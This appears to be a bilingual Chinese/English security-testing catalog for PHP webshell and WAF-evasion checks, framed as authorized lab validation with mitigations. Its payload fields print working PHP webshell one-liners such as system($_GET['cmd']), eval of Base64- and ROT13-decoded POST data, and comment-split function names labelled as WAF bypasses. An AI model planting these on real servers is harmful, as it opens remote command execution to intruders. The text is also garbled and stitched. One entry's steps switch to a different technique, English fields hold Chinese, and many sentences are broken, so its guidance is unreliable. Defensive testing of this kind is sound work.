vulnerability.en: If the server treats backslashes as path characters while a browser treats them as slashes, an allowed relative URL may navigate to an external host. Confirmation requires Confirm that the server accepts the value and a real browser ultimately navigates to the unallowed test domain; Browser remaining on origin, encoded values, network-library rejection, or external domain shown only in server logs is not vulnerability evidence.

exploitation.zh: 1. 记录普通相对路径、协议相对外部 URL 和单反斜杠值的结构化解析与浏览器目标；2. 逐项提交原始混合分隔符变体，并把 evil.com 替换为自有测试接收域；3. 确认服务端允许该值且真实浏览器最终导航到未允许测试域。浏览器停留原站、值被编码、网络库拒绝或仅服务端日志显示外域应记录为误报。
exploitation.en: 1. Record structured parsing and browser destinations for a normal relative path, protocol-relative external URL, and a single-backslash value. 2. Submit original mixed-separator variants one at a time and replace evil.com with an owned test receiver. 3. Confirm that the server accepts the value and a real browser ultimately navigates to the unallowed test domain. Treat Browser remaining on origin, encoded values, network-library rejection, or external domain shown only in server logs as false positives.

mitigation.zh: 1. 使用与最终客户端一致的标准 URL 解析并拒绝反斜杠；2. 仅允许服务端映射的相对路径或精确外部 origin；3. 在浏览器端到端测试协议相对、userinfo 和混合分隔符。
mitigation.en: 1. Use a standard URL parser aligned with the final client and reject backslashes. 2. Allow only server-mapped relative paths or exact external origins. 3. End-to-end test protocol-relative, userinfo, and mixed-separator cases in browsers.

name.zh: PHP 请求参数 WebShell

description.zh: 覆盖 system、shell_exec、passthru、反引号、动态函数与历史 eval/assert 形式，验证上传或写入的 PHP 文件是否把请求参数解释为代码或命令。
description.en: Covers system, shell_exec, passthru, backticks, dynamic functions, and legacy eval or assert forms to test whether an uploaded or written PHP file interprets request parameters as code or commands.

prerequisites.zh: 已在授权隔离环境定位“PHP 请求参数 WebShell”的真实输入点、处理器和运行时版本，并确认：攻击者可将 PHP 内容写入可访问且可执行位置，服务器处理器映射到 PHP，并且请求参数到达危险函数。
prerequisites.en: The authorized isolated environment identifies the real input, handler, and runtime version for PHP Request-Parameter Webshells, confirming that an attacker can place PHP content in an accessible executable location, the server maps it to PHP, and request parameters reach dangerous functions.

prerequisites.zh: 测试 worker 可随时销毁，并能同时观察最终规范文件名、PHP 处理器日志、一次性固定输出和对应请求参数能够关联。
prerequisites.en: The test worker is disposable and can observe the final canonical filename, PHP handler log, one-time fixed output, and corresponding request parameter correlate.

title.zh: PHP一句话木马
title.en: Validation step 1 for PHP Request-Parameter Webshells

execution.command:
<?php system($_GET['cmd']); ?>
<?php system($_GET[1]); ?>
<?php eval($_POST[cmd]);?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php echo passthru($_GET['cmd']); ?>
<?=`$_GET[1]`?>
<?=`$_GET[0]`?>
<?php $_GET['a']($_GET['b']); ?>
<?php $_POST['a']($_POST['b']);?>
<?php @eval(base64_decode($_POST['z'])); ?>
<?php $func=create_function('',$_POST[a]);$func();?>
<?php call_user_func('assert',$_POST[a]);?>
<?php array_map('assert',(array)$_POST[a]);?>
<% eval request("a") %>
<script language="php">system("id"); </script>

description.zh: PHP一句话木马包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this PHP Request-Parameter Webshells validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性要求可控输入连续到达危险运行时 API，并取得最终规范文件名、PHP 处理器日志、一次性固定输出和对应请求参数能够关联。代码片段、语法错误、HTTP 200、参数回显，或在已有本地 Shell 中手工运行命令均属假阳性或前置能力，不能证明“PHP 文件是否由服务器解释，并把 GET 或 POST 参数传给命令执行、动态函数或代码求值结构”。
analysis.en: A positive requires a continuous path from controllable input to a dangerous runtime API plus the final canonical filename, PHP handler log, one-time fixed output, and corresponding request parameter correlate. Snippets, syntax errors, HTTP 200, reflection, or manual commands after an existing shell are false positives or prerequisites and do not prove whether the server interprets a PHP file and passes GET or POST values to command execution, dynamic functions, or code evaluation.

opsecTips.zh: PHP 请求参数 WebShell停止条件：“PHP 请求参数 WebShell”只允许使用一次性固定标记；出现非预期子进程、外部网络、文件写入或权限变化时，立即终止 worker 并停止测试。 本条重点观察“PHP 文件是否由服务器解释，并把 GET 或 POST 参数传给命令执行、动态函数或代码求值结构”。
opsecTips.en: PHP Request-Parameter Webshells stop condition: Use only a one-time fixed marker for PHP Request-Parameter Webshells; terminate the worker and stop on unexpected child processes, external network, writes, or privilege changes. The entry-specific focus is whether the server interprets a PHP file and passes GET or POST values to command execution, dynamic functions, or code evaluation.

opsecTips.zh: PHP 请求参数 WebShell清理条件：结束后删除标记与临时脚本，关闭全部子进程，重建 worker，并确认日志未残留凭据、命令输出或业务数据。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: PHP Request-Parameter Webshells cleanup condition: Remove markers and temporary scripts, terminate child processes, rebuild the worker, and verify logs contain no credentials, command output, or business data. Recheck that no triggerable state remains for this technique.

title.zh: 确认“PHP 请求参数 WebShell”执行入口
title.en: Confirm the PHP Request-Parameter Webshells execution entry

description.zh: 定位真实输入、处理器与最终 API，核对前提“攻击者可将 PHP 内容写入可访问且可执行位置，服务器处理器映射到 PHP，并且请求参数到达危险函数”，并记录运行时版本和服务身份。
description.en: Locate the real input, handler, and final API, confirm that an attacker can place PHP content in an accessible executable location, the server maps it to PHP, and request parameters reach dangerous functions, and record runtime version and service identity.

title.zh: 建立“PHP WebShell 请求处理”安全基线
title.en: Establish the PHP Webshell Request Handling baseline

description.zh: 使用普通参数或固定业务操作保存正常响应、进程和文件行为，并采用“最终规范文件名、PHP 处理器日志、一次性固定输出和对应请求参数能够关联”作为异常证据。
description.en: Use normal parameters or a fixed business operation to record response, process, and file behavior, accepting the final canonical filename, PHP handler log, one-time fixed output, and corresponding request parameter correlate as abnormal evidence.

title.zh: 逐行验证“PHP 请求参数 WebShell”
title.en: Validate PHP Request-Parameter Webshells line by line

description.zh: 测试步骤为：在隔离上传实例使用仅输出固定标记的替代文件，逐个区分命令函数、动态调用和历史求值语法，记录 PHP 版本与无效行。每轮只替换一行，所有命令、路径与网络地址均改为隔离的无害标记。
description.en: use a replacement file that only emits a fixed marker in an isolated upload instance, separate command functions, dynamic calls, and legacy evaluation syntax, and record PHP version plus invalid lines. Replace one line per run and substitute every command, path, and network destination with an isolated harmless marker.

attackChain.payload:
<?php system($_GET['cmd']); ?>
<?php system($_GET[1]); ?>
<?php eval($_POST[cmd]);?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php echo passthru($_GET['cmd']); ?>
<?=`$_GET[1]`?>
<?=`$_GET[0]`?>
<?php $_GET['a']($_GET['b']); ?>
<?php $_POST['a']($_POST['b']);?>
<?php @eval(base64_decode($_POST['z'])); ?>
<?php $func=create_function('',$_POST[a]);$func();?>
<?php call_user_func('assert',$_POST[a]);?>
<?php array_map('assert',(array)$_POST[a]);?>
<% eval request("a") %>
<script language="php">system("id"); </script>

title.zh: 修复运行时边界并回归
title.en: Remediate and regress the runtime boundary

description.zh: 实施“将上传文件存于 Web 根目录外并设为不可执行，移除动态命令接口，按上下文处理参数，升级 PHP 并删除 assert/create_function 等旧路径”后重放正常与异常基线，确认业务功能保留且危险进程或文件能力不再可控。
description.en: After applying store uploads outside the web root as non-executable objects, remove dynamic command interfaces, handle parameters by context, upgrade PHP, and remove legacy assert or create_function paths, replay normal and abnormal baselines to preserve business behavior while dangerous process or file capabilities are no longer controllable.

overview.zh: PHP 请求参数 WebShell用于核对PHP 文件是否由服务器解释，并把 GET 或 POST 参数传给命令执行、动态函数或代码求值结构。该条目只在以下前提下适用：攻击者可将 PHP 内容写入可访问且可执行位置，服务器处理器映射到 PHP，并且请求参数到达危险函数。有效判定必须取得最终规范文件名、PHP 处理器日志、一次性固定输出和对应请求参数能够关联；代码片段存在、请求返回 200 或单纯字符串回显都不能证明远程代码执行。
overview.en: PHP Request-Parameter Webshells checks whether the server interprets a PHP file and passes GET or POST values to command execution, dynamic functions, or code evaluation. It applies when an attacker can place PHP content in an accessible executable location, the server maps it to PHP, and request parameters reach dangerous functions. A valid finding requires the final canonical filename, PHP handler log, one-time fixed output, and corresponding request parameter correlate; source snippets, an HTTP 200 response, or simple reflection do not prove remote code execution.

vulnerability.zh: 风险根因是攻击者可将 PHP 内容写入可访问且可执行位置，服务器处理器映射到 PHP，并且请求参数到达危险函数，使应用可能暴露“PHP 文件是否由服务器解释，并把 GET 或 POST 参数传给命令执行、动态函数或代码求值结构”这一运行时边界。审计必须把入口、最终 API、服务身份、平台版本和进程或文件证据连续关联，避免把已经具备本地执行能力的后续命令误报成初始漏洞。
vulnerability.en: The risk exists when an attacker can place PHP content in an accessible executable location, the server maps it to PHP, and request parameters reach dangerous functions, exposing the runtime boundary of whether the server interprets a PHP file and passes GET or POST values to command execution, dynamic functions, or code evaluation. Review must correlate the entry, final API, service identity, platform version, and process or file evidence so post-execution commands are not misreported as the initial vulnerability.

exploitation.zh: 在隔离上传实例使用仅输出固定标记的替代文件，逐个区分命令函数、动态调用和历史求值语法，记录 PHP 版本与无效行。测试仅使用一次性、无副作用的固定标记，每轮只验证一种 API 或运行时分支，并记录调用栈、标准输出、子进程或文件审计；一旦出现非预期写入、网络连接或权限变化立即停止。
exploitation.en: use a replacement file that only emits a fixed marker in an isolated upload instance, separate command functions, dynamic calls, and legacy evaluation syntax, and record PHP version plus invalid lines. Use one-time side-effect-free markers, validate one API or runtime branch per run, and retain call stacks, stdout, child-process, or file audit evidence; stop on unintended writes, connections, or privilege changes.

mitigation.zh: 将上传文件存于 Web 根目录外并设为不可执行，移除动态命令接口，按上下文处理参数，升级 PHP 并删除 assert/create_function 等旧路径。修复后使用相同入口重放正常业务参数和最小异常样例，确认合法功能保留，同时危险 API 不再接受可控值，服务账户也无法通过替代路径创建进程或读取越界文件。
mitigation.en: store uploads outside the web root as non-executable objects, remove dynamic command interfaces, handle parameters by context, upgrade PHP, and remove legacy assert or create_function paths. Replay normal business parameters and minimized abnormal cases through the same entry to preserve legitimate behavior while preventing controllable values from reaching dangerous APIs or alternate process and file paths.

name.zh: PHP 标识符注释分割样例

description.zh: 尝试用块注释拆分 system、eval、assert 等函数名，验证 PHP 词法规则与上传/WAF 检测之间的差异；多数拆分函数名并非有效 PHP。
description.en: Attempts to split system, eval, assert, and related function names with block comments to compare PHP lexical rules with upload or WAF detection; most split identifiers are not valid PHP.

subCategory.zh: PHP 词法与 WAF 差异

prerequisites.zh: 已固定“PHP 标识符注释分割样例”使用的 WAF 规则集、PHP 版本、源站处理器和请求路径，并确认：输入进入 PHP 可执行文件或求值上下文，边缘规则只做字符串匹配，且测试 PHP 版本与样例语法相符。
prerequisites.en: The WAF ruleset, PHP version, origin handler, and request path for PHP Identifier Comment-Splitting Samples are pinned, confirming that input reaches an executable PHP file or evaluator, edge rules use string matching, and the tested PHP version matches the sample syntax.

prerequisites.zh: 隔离站点可同时取得 WAF 动作、PHP lint/运行结果和WAF 动作、PHP lint 结果、运行时错误或固定标记输出通过请求 ID 对应。
prerequisites.en: The isolated site can capture WAF action, PHP lint or runtime results, and WAF action, PHP lint result, runtime error or fixed marker output correlate by request ID, and accepted but invalid syntax is recorded as negative.

title.zh: 标准测试

execution.command:
<?php sys/**/tem($_GET['cmd']); ?>
<?php syst/**/em($_GET['cmd']); ?>
<?php e/**/va/**/l($_POST['cmd']);?>
<?php a/**/ss/**/ert($_POST['cmd']);?>
<?php pa/**/sst/**/hru($_GET['cmd']); ?>
<?php sh/**/el/**/l_ex/**/ec($_GET['cmd']); ?>
<?php fil/**/e_ge/**/t_con/**/tents('/flag'); ?>

description.zh: 标准payload
description.en: Standard payloads

analysis.zh: 阳性要求同一输入被 WAF 放行、在目标 PHP 版本语法有效、到达可执行位置并取得WAF 动作、PHP lint 结果、运行时错误或固定标记输出通过请求 ID 对应。放行但 lint 失败、函数在该版本失效、仅返回源码或未进入 PHP handler 均为假阳性，不能证明“WAF 是否放行注释分割形式，以及 PHP lexer 是否仍把拆分后的字符识别为同一函数标识符”。
analysis.en: A positive requires WAF acceptance, valid target-version PHP syntax, arrival at an executable location, and WAF action, PHP lint result, runtime error or fixed marker output correlate by request ID, and accepted but invalid syntax is recorded as negative. Failed lint, removed semantics, source-only responses, or no PHP handler are false positives and do not prove whether a WAF accepts comment-split forms and whether the PHP lexer still recognizes the separated characters as one function identifier.

title.en: Run PHP syntax and baseline checks

description.zh: 先对原行做 lint 并保存未变形请求基线，采用“编码输入、服务端解码值、WAF 动作、PHP 版本和一次性固定求值结果完整关联”区分放行、语法失败与真实执行。
description.en: Lint original lines and record an unmodified request baseline, using the encoded input, server-decoded value, WAF action, PHP version, and one-time fixed evaluation result fully correlate to separate acceptance, syntax failure, and execution.

title.zh: 单变量验证“PHP Base64 解码后动态求值”
title.en: Run a single-variable PHP Base64 Decode-Then-Evaluate Patterns check

description.zh: 测试步骤为：先用编码后的固定字符串验证解码链，再以只设置局部变量的无害 PHP 表达式确认求值，不提交系统命令。只改变一种词法或编码形式，实际运行使用无害 PHP 表达式。
description.en: verify decoding with an encoded fixed string, then confirm evaluation with a harmless PHP expression that only sets a local variable without system commands. Change one lexical or encoding form and use a harmless PHP expression at runtime.

attackChain.payload:
<?php eval(base64_decode($_POST['cmd']));?>
<?php eval(base64_decode($_GET['cmd']));?>
<?php assert(base64_decode($_POST['cmd']));?>
<?php $a=base64_decode($_POST['cmd']);eval($a);?>

title.zh: 统一规范化并移除求值路径

description.zh: 实施“删除解码后求值设计，使用结构化数据与严格 schema；WAF 对允许的编码字段解码后检查，上传目录保持不可执行”并重放所有有效与无效行，确认源站不可执行且 WAF 结论与 PHP parser 一致。
description.en: Apply remove decode-then-evaluate designs, use structured data with a strict schema, inspect allowed encoded fields after decoding, and keep upload storage non-executable and replay valid and invalid lines to prove the origin is non-executable and WAF decisions match the PHP parser.

overview.zh: PHP Base64 解码后动态求值用于比较安全设备、PHP lexer 与运行时对同一输入的处理，核心问题是WAF 是否只检查编码外层，而 PHP 在运行时解码后把结果交给代码求值函数。成立前提为：攻击者控制的参数进入 base64_decode 与 eval/assert 连续调用，且危险求值函数在目标版本仍具有代码执行语义。判定必须包含编码输入、服务端解码值、WAF 动作、PHP 版本和一次性固定求值结果完整关联，WAF 放行但语法无效的样例应明确记录为阴性。
overview.en: PHP Base64 Decode-Then-Evaluate Patterns compares security-device, PHP lexer, and runtime handling of the same input, focusing on whether a WAF inspects only the encoded wrapper while PHP decodes the value at runtime and passes it to a code evaluator. It applies when an attacker-controlled parameter reaches a base64_decode plus eval or assert chain and the evaluator still has code-execution semantics in the target version. Evidence requires the encoded input, server-decoded value, WAF action, PHP version, and one-time fixed evaluation result fully correlate; WAF acceptance of invalid syntax is a negative result.

vulnerability.zh: 多层差异出现在攻击者控制的参数进入 base64_decode 与 eval/assert 连续调用，且危险求值函数在目标版本仍具有代码执行语义时，可能造成“WAF 是否只检查编码外层，而 PHP 在运行时解码后把结果交给代码求值函数”。应用漏洞仍以最终可执行 PHP 数据流为前提，边缘规则只是纵深防御；若 PHP lint、版本语义或运行结果不成立，就不能依据规则未命中确认 RCE。
vulnerability.en: A differential appears when an attacker-controlled parameter reaches a base64_decode plus eval or assert chain and the evaluator still has code-execution semantics in the target version, potentially causing whether a WAF inspects only the encoded wrapper while PHP decodes the value at runtime and passes it to a code evaluator. The application finding still requires an executable PHP data flow and the edge rule is only defense in depth; failed lint, incompatible semantics, or absent execution precludes RCE.

exploitation.zh: 先用编码后的固定字符串验证解码链，再以只设置局部变量的无害 PHP 表达式确认求值，不提交系统命令。固定 PHP、WAF 和源站版本，先做语法检查，再以一次性局部变量或固定字符串替代系统命令；每轮只改变一种大小写、编码、注释或运算形式，并通过请求 ID 关联各层结果。
exploitation.en: verify decoding with an encoded fixed string, then confirm evaluation with a harmless PHP expression that only sets a local variable without system commands. Pin PHP, WAF, and origin versions, lint first, replace system commands with a one-time local variable or fixed string, change one case, encoding, comment, or operator form per run, and correlate layers by request ID.

mitigation.zh: 删除解码后求值设计，使用结构化数据与严格 schema；WAF 对允许的编码字段解码后检查，上传目录保持不可执行。回归应同时覆盖合法 PHP 业务、原始异常行和同义变体，确认上传/写入边界不可执行、运行时不再动态求值，且 WAF 与应用采用一致的规范化模型。
mitigation.en: remove decode-then-evaluate designs, use structured data with a strict schema, inspect allowed encoded fields after decoding, and keep upload storage non-executable. Regression should cover valid PHP behavior, original abnormal lines, and semantic variants while proving upload or write storage is non-executable, runtime evaluation is removed, and WAF and application normalization agree.

name.zh: PHP ROT13 解码后动态求值

description.zh: 通过 str_rot13 或 ROT13+Base64 链还原参数后调用 eval，验证多阶段解码与检测顺序不一致造成的 PHP 代码执行风险。
description.en: Restores parameters through str_rot13 or ROT13 plus Base64 before eval, testing PHP code-execution risk from inconsistent multi-stage decoding and inspection order.

prerequisites.zh: 已固定“PHP ROT13 解码后动态求值”使用的 WAF 规则集、PHP 版本、源站处理器和请求路径，并确认：参数经过 str_rot13 或组合解码后直接进入 eval，防护仅匹配原始请求字节或执行不同的解码顺序。
prerequisites.en: The WAF ruleset, PHP version, origin handler, and request path for PHP ROT13 Decode-Then-Evaluate Patterns are pinned, confirming that a parameter reaches eval after str_rot13 or combined decoding while defenses inspect only raw request bytes or decode in a different order.

prerequisites.zh: 隔离站点可同时取得 WAF 动作、PHP lint/运行结果和每一步解码中间值、WAF 动作与无害 PHP 表达式结果在同一请求中可重现。
prerequisites.en: The isolated site can capture WAF action, PHP lint or runtime results, and each intermediate decoded value, WAF action, and harmless PHP expression result are reproducible in one request.

title.zh: 标准测试

description.zh: 标准payload
description.en: Standard payloads

analysis.zh: 阳性要求同一输入被 WAF 放行、在目标 PHP 版本语法有效、到达可执行位置并取得每一步解码中间值、WAF 动作与无害 PHP 表达式结果在同一请求中可重现。放行但 lint 失败、函数在该版本失效、仅返回源码或未进入 PHP handler 均为假阳性，不能证明“WAF、应用与 PHP 对 ROT13 和 Base64 的解码次数与顺序是否一致，并最终到达 eval”。
analysis.en: A positive requires WAF acceptance, valid target-version PHP syntax, arrival at an executable location, and each intermediate decoded value, WAF action, and harmless PHP expression result are reproducible in one request. Failed lint, removed semantics, source-only responses, or no PHP handler are false positives and do not prove whether the WAF, application, and PHP agree on ROT13 and Base64 decoding count and order before eval.

opsecTips.zh: PHP ROT13 解码后动态求值停止条件：所有系统命令替换为局部变量或固定字符串；若源站执行非标记函数、产生外连或写入 Web 目录，立即禁用测试路由。 本条重点观察“WAF、应用与 PHP 对 ROT13 和 Base64 的解码次数与顺序是否一致，并最终到达 eval”。
opsecTips.en: PHP ROT13 Decode-Then-Evaluate Patterns stop condition: Replace system commands with local variables or fixed strings; disable the route if the origin invokes a non-marker function, connects outward, or writes web storage. The entry-specific focus is whether the WAF, application, and PHP agree on ROT13 and Base64 decoding count and order before eval.

opsecTips.zh: PHP ROT13 解码后动态求值清理条件：完成后删除测试 PHP 文件，清理 opcode、WAF 与 CDN 缓存并恢复规则快照，再用正常请求确认没有遗留阻断或宽泛例外。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: PHP ROT13 Decode-Then-Evaluate Patterns cleanup condition: Remove test PHP files, clear opcode, WAF, and CDN caches, restore the rules snapshot, and verify normal requests have no residual block or broad exception. Recheck that no triggerable state remains for this technique.

title.zh: PHP WAF绕过: str_rot13
title.en: Validation step 1 for PHP ROT13 Decode-Then-Evaluate Patterns

description.zh: PHP WAF绕过: str_rot13，共3条
description.en: bypass payloads

title.zh: 固定“PHP ROT13 解码后动态求值”多层版本
title.en: Pin the PHP ROT13 Decode-Then-Evaluate Patterns processing versions

description.zh: 记录 WAF 规则、PHP 版本、源站处理器与请求路径，核对前提“参数经过 str_rot13 或组合解码后直接进入 eval，防护仅匹配原始请求字节或执行不同的解码顺序”。
description.en: Record WAF rules, PHP version, origin handler, and request path, confirming that a parameter reaches eval after str_rot13 or combined decoding while defenses inspect only raw request bytes or decode in a different order.

title.zh: 执行 PHP 语法与基线检查
title.en: Run PHP syntax and baseline checks

description.zh: 先对原行做 lint 并保存未变形请求基线，采用“每一步解码中间值、WAF 动作与无害 PHP 表达式结果在同一请求中可重现”区分放行、语法失败与真实执行。
description.en: Lint original lines and record an unmodified request baseline, using each intermediate decoded value, WAF action, and harmless PHP expression result are reproducible in one request to separate acceptance, syntax failure, and execution.

title.zh: 单变量验证“PHP ROT13 解码后动态求值”
title.en: Run a single-variable PHP ROT13 Decode-Then-Evaluate Patterns check

description.zh: 测试步骤为：分别测试纯 ROT13、GET/POST 来源和 ROT13+Base64 三条链，只使用固定字符串与局部变量表达式，并保存每层解码值。只改变一种词法或编码形式，实际运行使用无害 PHP 表达式。
description.en: test pure ROT13, GET versus POST, and ROT13 plus Base64 separately using fixed strings and local-variable expressions while retaining every decoded stage. Change one lexical or encoding form and use a harmless PHP expression at runtime.

attackChain.payload:
<?php eval(str_rot13($_POST['cmd']));?>
<?php eval(str_rot13($_GET['cmd']));?>
<?php eval(str_rot13(base64_decode($_POST['cmd'])));?>

title.zh: 统一规范化并移除求值路径

description.zh: 实施“禁止任何解码后 eval 路径，编码字段采用明确格式和长度限制，安全设备与应用共享同一规范化顺序”并重放所有有效与无效行，确认源站不可执行且 WAF 结论与 PHP parser 一致。
description.en: Apply prohibit all decode-then-eval paths, constrain encoded fields by explicit format and length, and align security devices and applications on one normalization order and replay valid and invalid lines to prove the origin is non-executable and WAF decisions match the PHP parser.

overview.zh: PHP ROT13 解码后动态求值用于比较安全设备、PHP lexer 与运行时对同一输入的处理，核心问题是WAF、应用与 PHP 对 ROT13 和 Base64 的解码次数与顺序是否一致，并最终到达 eval。成立前提为：参数经过 str_rot13 或组合解码后直接进入 eval，防护仅匹配原始请求字节或执行不同的解码顺序。判定必须包含每一步解码中间值、WAF 动作与无害 PHP 表达式结果在同一请求中可重现，WAF 放行但语法无效的样例应明确记录为阴性。
overview.en: PHP ROT13 Decode-Then-Evaluate Patterns compares security-device, PHP lexer, and runtime handling of the same input, focusing on whether the WAF, application, and PHP agree on ROT13 and Base64 decoding count and order before eval. It applies when a parameter reaches eval after str_rot13 or combined decoding while defenses inspect only raw request bytes or decode in a different order. Evidence requires each intermediate decoded value, WAF action, and harmless PHP expression result are reproducible in one request; WAF acceptance of invalid syntax is a negative result.

vulnerability.zh: 多层差异出现在参数经过 str_rot13 或组合解码后直接进入 eval，防护仅匹配原始请求字节或执行不同的解码顺序时，可能造成“WAF、应用与 PHP 对 ROT13 和 Base64 的解码次数与顺序是否一致，并最终到达 eval”。应用漏洞仍以最终可执行 PHP 数据流为前提，边缘规则只是纵深防御；若 PHP lint、版本语义或运行结果不成立，就不能依据规则未命中确认 RCE。
vulnerability.en: A differential appears when a parameter reaches eval after str_rot13 or combined decoding while defenses inspect only raw request bytes or decode in a different order, potentially causing whether the WAF, application, and PHP agree on ROT13 and Base64 decoding count and order before eval. The application finding still requires an executable PHP data flow and the edge rule is only defense in depth; failed lint, incompatible semantics, or absent execution precludes RCE.

exploitation.zh: 分别测试纯 ROT13、GET/POST 来源和 ROT13+Base64 三条链，只使用固定字符串与局部变量表达式，并保存每层解码值。固定 PHP、WAF 和源站版本，先做语法检查，再以一次性局部变量或固定字符串替代系统命令；每轮只改变一种大小写、编码、注释或运算形式，并通过请求 ID 关联各层结果。
exploitation.en: test pure ROT13, GET versus POST, and ROT13 plus Base64 separately using fixed strings and local-variable expressions while retaining every decoded stage. Pin PHP, WAF, and origin versions, lint first, replace system commands with a one-time local variable or fixed string, change one case, encoding, comment, or operator form per run, and correlate layers by request ID.

mitigation.zh: 禁止任何解码后 eval 路径，编码字段采用明确格式和长度限制，安全设备与应用共享同一规范化顺序。回归应同时覆盖合法 PHP 业务、原始异常行和同义变体，确认上传/写入边界不可执行、运行时不再动态求值，且 WAF 与应用采用一致的规范化模型。
mitigation.en: prohibit all decode-then-eval paths, constrain encoded fields by explicit format and length, and align security devices and applications on one normalization order. Regression should cover valid PHP behavior, original abnormal lines, and semantic variants while proving upload or write storage is non-executable, runtime evaluation is removed, and WAF and application normalization agree.

name.zh: PHP 短 Echo 标签与反引号执行边界
name.en: PHP Short-Echo Tag and Backtick Execution Boundary

description.zh: 使用三条短 echo 标签变体验证 PHP 版本、数组偏移语法与反引号命令运算符的处理，并区分当前方括号语法和已移除的花括号语法。
description.en: Uses three short-echo-tag variants to test PHP-version handling of array offsets and the backtick command operator while separating current bracket syntax from removed curly-brace syntax.

subCategory.zh: PHP 标签与版本语法边界

prerequisites.zh: 已确认文件会由目标 PHP 版本解释，并记录 PHP 版本、SAPI 与 short_open_tag 配置
prerequisites.en: The file is confirmed to be interpreted by the target PHP version, with PHP version, SAPI, and short_open_tag setting recorded.

prerequisites.zh: 隔离实例把请求参数限制为固定 marker-helper，且可审计 PHP 父进程与唯一子进程
prerequisites.en: The isolated instance restricts request parameters to a fixed marker-helper, and the PHP parent and sole child process are auditable.

title.zh: 短 Echo 标签反引号变体

description.zh: 原行只作版本追溯。执行时参数仅指向无副作用 marker-helper；PHP 8 上两条花括号偏移应作为解析失败对照。
description.en: 原行只作版本追溯。执行时参数仅指向无副作用 marker-helper；PHP 8 上两条花括号偏移应作为解析失败对照。

analysis.zh: 完整阳性要求语法在目标版本有效、WAF 后到达 PHP、反引号启动受控 marker-helper 并返回唯一输出。WAF 放行、短标签被识别、PHP 8 的花括号解析错误或命令字符串回显都只是部分或阴性证据。
analysis.en: A complete positive requires syntax valid for the target version, delivery through the WAF to PHP, a backtick-launched controlled marker-helper, and unique output. WAF acceptance, short-tag recognition, PHP 8 curly-brace parse errors, and command-string reflection are partial or negative evidence.

opsecTips.zh: 仅允许签名 marker-helper 且执行一次；出现其他 shell、文件读取或网络事件立即停止
opsecTips.en: Permit only the signed marker-helper for one execution; stop immediately on any other shell, file read, or network event.

opsecTips.zh: 测试后删除 PHP 页面和帮助程序，清空 opcode/WAF 缓存，并撤销请求令牌
opsecTips.en: After testing delete the PHP page and helper, clear opcode and WAF caches, and revoke request tokens.

title.zh: WAF 对短标签与偏移语法的识别
title.en: WAF Recognition of Short Tags and Offset Syntax

description.zh: 保持源中重复的 WAF 分组用于一一对照；只比较拦截与到达 PHP 的差异，不把已移除语法的错误当成绕过。
description.en: Preserves the source's duplicate WAF group for direct comparison; compare filtering with PHP reachability and never treat an error from removed syntax as a bypass.

title.zh: 冻结 PHP 与 WAF 基线

description.zh: 记录目标版本、SAPI、文件映射和无害 PHP 页面经过 WAF 与解释器的完整路径。
description.en: Record target version, SAPI, file mapping, and the full WAF-to-interpreter path for a harmless PHP page.

title.zh: Lint 后提交单个有效变体
title.en: Submit one valid variant after linting

description.zh: 逐行 lint，仅将通过当前版本语法的行与 marker-helper 参数提交一次。
description.en: Lint each line and submit only a form valid for the current version with the marker-helper parameter once.

title.zh: 关联解释与子进程证据

description.zh: 匹配 WAF 决策、PHP 请求、父子 PID 与随机输出，明确花括号行的版本阴性。
description.en: Match WAF decision, PHP request, parent-child PIDs, and random output while documenting version-negative curly-brace forms.

title.zh: 关闭脚本解释并清理
title.en: Disable script interpretation and clean up

description.zh: 修复后重放有效/无效对照，确认上传内容不再解释，并删除页面、帮助程序和日志令牌。
description.en: After remediation replay valid and invalid controls, confirm uploaded content is no longer interpreted, and delete pages, helpers, and log tokens.

overview.zh: `<?=` 是 PHP 的短 echo 标签，自 PHP 5.4 起不依赖 short_open_tag；反引号会调用 shell。花括号数组/字符串偏移在 PHP 7.4 弃用、PHP 8 移除，因此三行不能在所有版本得到相同结果。
overview.en: <?= is PHP's short echo tag and has not depended on short_open_tag since PHP 5.4; backticks invoke the shell. Curly-brace array or string offsets were deprecated in PHP 7.4 and removed in PHP 8, so the three lines cannot behave identically across versions.

vulnerability.zh: 若上传或模板内容被 PHP 解释，且不可信参数进入反引号运算符，攻击者可能跨越数据与命令边界。WAF 放行只是前置条件，必须证明有效 PHP 语法到达解释器并启动受控子进程。
vulnerability.en: If uploaded or templated content is interpreted as PHP and untrusted parameters reach the backtick operator, data may cross into command execution. WAF acceptance is only a prerequisite; valid PHP must reach the interpreter and launch a controlled child process.

exploitation.zh: 在三个冻结版本环境分别 lint 三行，随后仅对语法有效的方括号行传入一次性 marker-helper。阳性要求请求、PHP 文件、父子 PID 和随机输出关联；源码回显、WAF 200、解析错误或短标签文本均不是执行。
exploitation.en: Lint the three lines under frozen PHP versions, then pass a one-time marker-helper only to the syntactically valid bracket form. A positive requires correlation across request, PHP file, parent and child PIDs, and random output; source reflection, a WAF 200, parse errors, and short-tag text are not execution.

mitigation.zh: 上传目录禁止脚本解释，模板不接受用户代码，移除反引号及其他进程 API，并以参数化业务操作替代命令。WAF 只作纵深防御；回归需覆盖 PHP 7.4/8.x 的语法差异。
mitigation.en: Disable script interpretation in upload storage, reject user code in templates, remove backticks and other process APIs, and replace commands with parameterized business operations. Treat the WAF only as defense in depth and regress PHP 7.4 and 8.x syntax differences.

name.zh: ASP 内联表达式解释边界

description.zh: 使用单条 `<%= "test" %>` 识别 Classic ASP/ASP.NET 风格内联表达式是否由服务器解释；该行只输出常量，不构成 WebShell 或命令执行。
description.en: Uses one <%= "test" %> expression to identify server interpretation of Classic ASP or ASP.NET-style inline output; the line emits a constant and is neither a web shell nor command execution.

subCategory.zh: ASP 服务端表达式对照
subCategory.en: ASP 服务端表达式对照

prerequisites.zh: 已确认测试文件映射到隔离 Classic ASP 或 ASP.NET 处理器，并记录具体运行时
prerequisites.en: The test file is confirmed to map to an isolated Classic ASP or ASP.NET handler, and the exact runtime is recorded.

prerequisites.zh: 页面仅包含常量表达式且无用户输入、文件 API、组件创建或进程调用
prerequisites.en: The page contains only the constant expression with no user input, file API, component creation, or process call.

title.zh: ASP 常量内联表达式

description.zh: 将这一行单独放入对应测试页面，只验证响应是否输出常量 test；不得扩展为动态命令或对象调用。
description.en: Place this line alone in the matching test page and verify only whether the response emits the constant test; do not extend it into dynamic commands or object calls.

